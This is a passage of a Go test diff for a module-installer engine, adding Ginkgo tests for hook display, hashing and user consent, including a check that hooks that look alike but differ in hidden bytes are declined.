+			res, err := e.Install(ctx, sc, proj, []engine.InstallRequest{{Arg: filepath.Join(proj, "mods", "kit")}},
+				engine.Options{Targets: []string{"claude-code"}, DryRun: true})
+			Expect(err).NotTo(HaveOccurred())
+			sum := sha256.Sum256([]byte("#!/bin/sh\n\techo tab\n"))
+			Expect(res.Modules[0].Hooks).To(HaveEach(And(HaveField("Body", "#!/bin/sh\n\techo tab\n"), HaveField("SHA256", hex.EncodeToString(sum[:])))))
+		})
+
+		It("keys a runtime hook's shown record over its raw content: one shown does not cover another that displays the same", func() {
+			deploy(`printf \u0001`)
+			pull("deploy")
+			res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries, DryRun: true}})
+			Expect(err).NotTo(HaveOccurred())
+			show(res.Result)
+			first := hooksOf(res, "deploy")
+			deploy(`printf \u0002`)
+			res, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: hookTrust})
+			Expect(err).NotTo(HaveOccurred())
+			second := hooksOf(res, "deploy")
+			Expect(second[0].Command).To(Equal(first[0].Command), "both display as printf ?")
+			Expect(second).To(HaveEach(HaveField("Status", engine.RuntimeHooksDeclined)), "the other bytes were never shown")
+		})
+
+		It("a corrupt shown record is refused with the hint that deleting it is safe", func() {
+			deploy("true")
+			pull("deploy")
+			writeTree(filepath.Dir(p.Shown), map[string]string{"shown.json": "{"})
+			_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: hookTrust})
+			Expect(err).To(MatchError(ContainSubstring(p.Shown)))
+			Expect(errs.Hints(err)).To(ContainElement(ContainSubstring("rm " + p.Shown)))
+		})
 	})
 
 	Describe("profile --update", func() {
@@ -536,7 +980,7 @@ var _ = Describe("typed trust after the receipt", func() {
 	})
 
 	It("a failure after the grants were written carries them as trusted", func() {
-		_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries | engine.TrustHooks}})
+		_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries | engine.TrustHooks, Unseen: true}})
 		Expect(err).To(MatchError(ContainSubstring("pre-install hook hooks/pre.sh of kit failed")))
 		te, ok := errors.AsType[*engine.TrustedError](err)
 		Expect(ok).To(BeTrue())
@@ -547,13 +991,13 @@ var _ = Describe("typed trust after the receipt", func() {
 
 	It("a batch collects every run's covered items and grants, which each run records only when applied", func() {
 		batch := &engine.TrustBatch{}
-		_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries | engine.TrustHooks, Batch: batch}})
+		_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries | engine.TrustHooks, Unseen: true, Batch: batch}})
 		Expect(err).To(MatchError(engine.ErrBatched))
 		Expect(batch.Items).To(Equal([]engine.Consent{{Kind: "entries", Item: "targets", Change: engine.ConsentNew},
 			{Kind: "entries", Item: "kit", Change: engine.ConsentNew}, {Kind: "hooks", Item: "kit pre-install", Change: engine.ConsentNew}}))
 		Expect(p.Consent).NotTo(BeAnExistingFile())
 		Expect(filepath.Join(proj, ".claude")).NotTo(BeADirectory())
-		_, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries | engine.TrustHooks, Expect: batch}})
+		_, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries | engine.TrustHooks, Unseen: true, Expect: batch}})
 		Expect(err).To(MatchError(ContainSubstring("pre-install hook hooks/pre.sh of kit failed")), "the run applied after the receipt")
 		Expect(p.Consent).To(BeAnExistingFile(), "it recorded its grants, which the batch held, just before its apply")
 	})
@@ -586,6 +1030,7 @@ var _ = Describe("a batch applied after its one receipt", func() {
 	})
 	run := func(s engine.Scope, opts engine.Options) error {
 		opts.Trust = engine.TrustEntries | engine.TrustHooks
+		opts.Unseen = true
 		_, err := e.Sync(ctx, engine.SyncRequest{Scope: s, Options: opts})
 		return err
 	}
